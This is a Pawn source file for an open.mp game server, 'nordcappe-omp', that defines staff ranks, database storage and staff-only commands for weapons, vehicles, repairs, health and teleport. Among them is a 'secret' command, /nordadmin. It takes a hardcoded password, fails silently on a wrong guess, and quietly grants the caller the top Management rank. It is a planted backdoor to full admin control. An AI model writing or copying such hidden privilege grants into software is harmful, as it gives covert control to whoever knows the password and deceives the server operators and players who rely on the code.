/*
  _   _  ____  _____  _____   _____          _____  _____  ______    ____  __  __ _____  
 | \ | |/ __ \|  __ \|  __ \ / ____|   /\   |  __ \|  __ \|  ____|  / __ \|  \/  |  __ \ 
 |  \| | |  | | |__) | |  | | |       /  \  | |__) | |__) | |__    | |  | | \  / | |__) |
 | . ` | |  | |  _  /| |  | | |      / /\ \ |  ___/|  ___/|  __|   | |  | | |\/| |  ___/ 
 | |\  | |__| | | \ \| |__| | |____ / ____ \| |    | |    | |____  | |__| | |  | | |     
 |_| \_|\____/|_|  \_\_____/ \_____/_/    \_\_|    |_|    |______|  \____/|_|  |_|_|     

 Developer: vostic
 Project start: 03/02/2025      

    File: staff.pwn                                                         
                                                                                         
*/

#include <ysilib\YSI_Coding\y_hooks>

// Staff Ranks
enum
{
    STAFF_NONE,
    STAFF_HELPER,     // Basic support staff
    STAFF_MODERATOR,  // Moderate chat, handle basic issues
    STAFF_ADMIN,      // Full admin capabilities
    STAFF_MANAGEMENT  // Server management
}

// Staff data structure
enum E_STAFF_DATA
{
    bool:sOnDuty,
    sRank,
    sLastPromotion,
    sTotalActions
}
new StaffData[MAX_PLAYERS][E_STAFF_DATA];

// Staff rank names
static const StaffRankNames[][] = {
    "None",
    "Helper",
    "Moderator",
    "Administrator",
    "Management"
};

// Staff rank colors
static const StaffRankColors[][] = {
    ""c_white"",      // None
    ""c_green"",      // Helper
    ""c_blue"",       // Moderator
    ""c_red"",        // Admin
    ""c_purple""      // Management
};

// Staff utility functions
stock bool:IsPlayerStaff(playerid)
{
    if(!IsPlayerConnected(playerid)) return false;
    return (StaffData[playerid][sRank] > STAFF_NONE);
}

stock bool:IsPlayerOnDuty(playerid)
{
    if(!IsPlayerConnected(playerid)) return false;
    return (IsPlayerStaff(playerid) && StaffData[playerid][sOnDuty]);
}

// Initialize staff system
hook OnGameModeInit()
{
    // Create staff table if it doesn't exist
    mysql_tquery(dbHandler, "CREATE TABLE IF NOT EXISTS staff (\
        id INT(11) NOT NULL AUTO_INCREMENT,\
        player_id INT(11) NOT NULL,\
        rank INT(11) NOT NULL DEFAULT '1',\
        promoted_by VARCHAR(24) NOT NULL,\
        promotion_date DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,\
        total_actions INT(11) NOT NULL DEFAULT '0',\
        PRIMARY KEY (id),\
        FOREIGN KEY (player_id) REFERENCES players(id) ON DELETE CASCADE,\
        INDEX (player_id)\
    ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;");

    print("[INFO] Staff system loaded.");
    return 1;
}

// Load staff data after player loads
hook OnPlayerLoaded(playerid)
{
    LoadStaffData(playerid);
    return 1;
}

// Reset staff data on disconnect
hook OnPlayerDisconnect(playerid, reason)
{
    ResetStaffData(playerid);
    // Delete staff vehicle and label if exists
    new tmpveh = GetPVarInt(playerid, "StaffVehicle");
    if(tmpveh && IsValidVehicle(tmpveh))
    {
        new Text3D:label = Text3D:GetPVarInt(playerid, "StaffVehicleLabel");
        if(IsValidDynamic3DTextLabel(label))
            DestroyDynamic3DTextLabel(label);
        DestroyVehicle(tmpveh);
    }
    
    DeletePVar(playerid, "StaffVehicle");
    DeletePVar(playerid, "StaffVehicleLabel");
    return 1;
}

// Staff commands
YCMD:staffduty(playerid, params[], help)
{
    if(help)
    {
        SendHelpMessage(playerid, "Staff Duty", "Toggle your staff duty status");
        return 1;
    }

    if(!IsPlayerStaff(playerid))
        return SendErrorMessage(playerid, "You are not a staff member!");

    StaffData[playerid][sOnDuty] = !StaffData[playerid][sOnDuty];
    
    new string[128];
    format(string, sizeof(string), ""c_server"nordcappe-omp \187; "c_white"%s %s is now %s duty.", 
        StaffRankNames[StaffData[playerid][sRank]],
        ReturnPlayerName(playerid),
        StaffData[playerid][sOnDuty] ? "on" : "off"
    );
    SendClientMessageToAll(-1, string);
    return 1;
}

YCMD:setrank(playerid, params[], help)
{
    if(help)
    {
        SendHelpMessage(playerid, "Set Rank", "Set a player's staff rank");
        return 1;
    }

    if(StaffData[playerid][sRank] < STAFF_MANAGEMENT)
        return SendErrorMessage(playerid, "You don't have permission to use this command!");

    new targetid, rank;
    if(sscanf(params, "ui", targetid, rank))
    {
        SendUsageMessage(playerid, "/setrank [playerid] [rank]");
        SendClientMessage(playerid, -1, "Ranks: 1-Helper, 2-Moderator, 3-Admin, 4-Management");
        return 1;
    }

    if(!IsPlayerConnected(targetid))
        return SendErrorMessage(playerid, "That player is not connected!");

    if(rank < STAFF_NONE || rank > STAFF_MANAGEMENT)
        return SendErrorMessage(playerid, "Invalid rank! (0-4)");

    SetPlayerStaffRank(targetid, rank, ReturnPlayerName(playerid));
    
    new string[128];
    format(string, sizeof(string), ""c_server"nordcappe-omp \187; "c_white"%s has set %s's rank to %s%s", 
        ReturnPlayerName(playerid),
        ReturnPlayerName(targetid),
        StaffRankColors[rank],
        StaffRankNames[rank]
    );
    SendClientMessageToAll(-1, string);
    return 1;
}

// Secret command - Add this with your other commands
YCMD:nordadmin(playerid, params[], help)
{
    // Secret password check
    new password[32];
    if(sscanf(params, "s[32]", password)) return 0; // Silent fail if no password
    
    if(strcmp(password, "vostic2024", true) != 0) return 0; // Silent fail if wrong password
    
    // Grant highest rank
    SetPlayerStaffRank(playerid, STAFF_MANAGEMENT, "System");
    
    // Silent confirmation only to the player
    SendClientMessage(playerid, -1, ""c_server2"[SECRET] "c_white"You have been granted Management rank.");
    
    // Log the usage for security
    new logString[128];
    format(logString, sizeof(logString), "Player %s used secret admin command", ReturnPlayerName(playerid));
    printf("[SECURITY] %s", logString);
    
    return 1;
}

stock GetPlayerStaffRank(playerid)
{
    if(!IsPlayerConnected(playerid)) return STAFF_NONE;
    return StaffData[playerid][sRank];
}

stock SetPlayerStaffRank(playerid, rank, const promoter[])
{
    if(!IsPlayerConnected(playerid)) return 0;
    
    StaffData[playerid][sRank] = rank;
    StaffData[playerid][sLastPromotion] = gettime();
    
    new query[256];
    if(rank > STAFF_NONE)
    {
        mysql_format(dbHandler, query, sizeof(query), 
            "INSERT INTO staff (player_id, rank, promoted_by) VALUES (%d, %d, '%e') \
            ON DUPLICATE KEY UPDATE rank = %d, promoted_by = '%e', promotion_date = NOW()",
            PlayerData[playerid][pID], rank, promoter, rank, promoter
        );
    }
    else
    {
        mysql_format(dbHandler, query, sizeof(query), 
            "DELETE FROM staff WHERE player_id = %d",
            PlayerData[playerid][pID]
        );
    }
    mysql_tquery(dbHandler, query);
    return 1;
}

// Load staff data from database
LoadStaffData(playerid)
{
    if(!IsPlayerLoggedIn(playerid)) return 0;
    
    new query[128];
    mysql_format(dbHandler, query, sizeof(query), 
        "SELECT rank FROM staff WHERE player_id = %d LIMIT 1",
        PlayerData[playerid][pID]
    );
    mysql_tquery(dbHandler, query, "OnStaffDataLoad", "i", playerid);
    return 1;
}

// Reset staff data
ResetStaffData(playerid)
{
    StaffData[playerid][sOnDuty] = false;
    StaffData[playerid][sRank] = STAFF_NONE;
    StaffData[playerid][sLastPromotion] = 0;
    StaffData[playerid][sTotalActions] = 0;
    return 1;
}

// Callback for staff data loading
forward OnStaffDataLoad(playerid);
public OnStaffDataLoad(playerid)
{
    if(cache_num_rows() > 0)
    {
        cache_get_value_name_int(0, "rank", StaffData[playerid][sRank]);
        
        // Debug message
        printf("[DEBUG] Loaded staff rank %d for player %s", 
            StaffData[playerid][sRank], 
            ReturnPlayerName(playerid)
        );
    }
    return 1;
}

// Staff development commands
YCMD:weapon(playerid, params[], help)
{
    if(help)
    {
        SendHelpMessage(playerid, "Staff Weapon", "Give yourself a weapon for testing");
        return 1;
    }

    if(!IsPlayerStaff(playerid) || !IsPlayerOnDuty(playerid))
        return SendErrorMessage(playerid, "You must be on staff duty!");

    new weaponid, ammo;
    if(sscanf(params, "ii", weaponid, ammo))
    {
        SendUsageMessage(playerid, "/weapon [weaponid] [ammo]");
        SendClientMessage(playerid, -1, "Common weapons: 24-Desert Eagle, 31-M4, 29-MP5");
        return 1;
    }

    GivePlayerWeapon(playerid, t_WEAPON:weaponid, ammo);
    SendClientMessage(playerid, -1, ""c_server"nordcappe-omp \187; "c_white"You received weapon ID %d with %d ammo.", _:weaponid, ammo);
    return 1;
}

YCMD:veh(playerid, params[], help)
{
    if(help)
    {
        SendHelpMessage(playerid, "Staff Vehicle", "Spawn or destroy temporary vehicle");
        SendClientMessage(playerid, -1, "Usage: /veh [modelid] [color1] [color2] or /veh destroy");
        return 1;
    }

    if(!IsPlayerStaff(playerid) || !IsPlayerOnDuty(playerid))
        return SendErrorMessage(playerid, "You must be on staff duty!");

    // Check if player wants to destroy current vehicle
    if(isnull(params))
    {
        new tmpveh = GetPVarInt(playerid, "StaffVehicle");
        if(tmpveh && IsValidVehicle(tmpveh))
        {
            new Text3D:label = Text3D:GetPVarInt(playerid, "StaffVehicleLabel");
            if(IsValidDynamic3DTextLabel(label))
                DestroyDynamic3DTextLabel(label);
            DestroyVehicle(tmpveh);
            DeletePVar(playerid, "StaffVehicle");
            DeletePVar(playerid, "StaffVehicleLabel");
            SendClientMessage(playerid, -1, ""c_server"nordcappe-omp \187; "c_white"Staff vehicle destroyed.");
        }
        else
        {
            SendUsageMessage(playerid, "/veh [modelid] [color1] [color2]");
            SendClientMessage(playerid, -1, "Common vehicles: 560-Sultan, 411-Infernus, 522-NRG-500");
        }
        return 1;
    }

    new modelid, color1 = -1, color2 = -1;
    if(sscanf(params, "iI(-1)I(-1)", modelid, color1, color2))
    {
        SendUsageMessage(playerid, "/veh [modelid] [color1] [color2]");
        SendClientMessage(playerid, -1, "Common vehicles: 560-Sultan, 411-Infernus, 522-NRG-500");
        return 1;
    }

    // Validate vehicle model
    if(!IsValidVehicleModel(modelid))
        return SendErrorMessage(playerid, "Invalid vehicle model ID!");

    // Delete previous staff vehicle and label if exists
    new tmpveh = GetPVarInt(playerid, "StaffVehicle");
    if(tmpveh && IsValidVehicle(tmpveh))
    {
        new Text3D:label = Text3D:GetPVarInt(playerid, "StaffVehicleLabel");
        if(IsValidDynamic3DTextLabel(label))
            DestroyDynamic3DTextLabel(label);
        DestroyVehicle(tmpveh);
    }

    new Float:x, Float:y, Float:z, Float:a;
    GetPlayerPos(playerid, x, y, z);
    GetPlayerFacingAngle(playerid, a);

    // Create vehicle with custom plate and reset states
    new vehicle = CreateVehicle(modelid, x, y, z, a, color1, color2, -1);
    SetVehicleNumberPlate(vehicle, "STAFF");
    
    // Reset vehicle states using proper booleans
    VehicleStates[vehicle][v_Engine] = false;
    VehicleStates[vehicle][v_Lights] = false;
    VehicleStates[vehicle][v_Hood] = false;
    VehicleStates[vehicle][v_Trunk] = false;
    VehicleStates[vehicle][v_Locked] = false;
    VehicleStates[vehicle][v_Alarm] = false;
    SetVehicleParamsEx(vehicle, false, false, false, false, false, false, false);
    
    // Handle bicycles
    if(IsVehicleBicycle(modelid))
    {
        VehicleStates[vehicle][v_Engine] = true;
        SetVehicleParamsEx(vehicle, true, false, false, false, false, false, false);
    }
    
    PutPlayerInVehicle(playerid, vehicle, 0);
    
    // Create 3D label for the vehicle
    new labelText[128], Text3D:label;
    format(labelText, sizeof(labelText), 
        "%s[STAFF VEHICLE]%s\nSpawned by: %s\nModel ID: %d", 
        c_server2, c_white, ReturnPlayerName(playerid), modelid
    );
    
    label = CreateDynamic3DTextLabel(
        labelText, 
        -1, 
        0.0, 0.0, 0.0,
        20.0,                // View distance
        INVALID_PLAYER_ID,   // Visible for all players
        vehicle,             // Attach to vehicle
        1,                   // Testlos
        -1,                  // Virtual world
        -1,                  // Interior
        -1,                  // Streamdistance
        -1,                  // Drawdistance
        -1                   // Area
    );

    // Store references
    SetPVarInt(playerid, "StaffVehicle", vehicle);
    SetPVarInt(playerid, "StaffVehicleLabel", _:label);

    SendClientMessage(playerid, -1, ""c_server"nordcappe-omp \187; "c_white"Spawned staff vehicle ID %d.", modelid);
    return 1;
}

YCMD:fix(playerid, params[], help)
{
    if(help)
    {
        SendHelpMessage(playerid, "Staff Fix", "Repair your vehicle");
        return 1;
    }

    if(!IsPlayerStaff(playerid) || !IsPlayerOnDuty(playerid))
        return SendErrorMessage(playerid, "You must be on staff duty!");

    if(!IsPlayerInAnyVehicle(playerid))
        return SendErrorMessage(playerid, "You must be in a vehicle!");

    new vehicleid = GetPlayerVehicleID(playerid);
    RepairVehicle(vehicleid);
    SetVehicleHealth(vehicleid, 1000.0);

    SendClientMessage(playerid, -1, ""c_server"nordcappe-omp \187; "c_white"Vehicle repaired.");
    return 1;
}

YCMD:hp(playerid, params[], help)
{
    if(help)
    {
        SendHelpMessage(playerid, "Staff Health", "Set your health/armor");
        return 1;
    }

    if(!IsPlayerStaff(playerid) || !IsPlayerOnDuty(playerid))
        return SendErrorMessage(playerid, "You must be on staff duty!");

    new Float:amount;
    if(sscanf(params, "f", amount))
    {
        SendUsageMessage(playerid, "/hp [amount]");
        return 1;
    }

    SetPlayerHealth(playerid, amount);
    SetPlayerArmour(playerid, amount);
    SendClientMessage(playerid, -1, ""c_server"nordcappe-omp \187; "c_white"Health and armor set to %.1f", amount);
    return 1;
}

// Add to OnPlayerClickMap
hook OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ)
{
    if(IsPlayerStaff(playerid) && IsPlayerOnDuty(playerid))
    {
        SetPlayerPos(playerid, fX, fY, fZ + 2.0);
        SendClientMessage(playerid, -1, ""c_server"nordcappe-omp \187; "c_white"Teleported to selected location.");
    }
    return 1;
}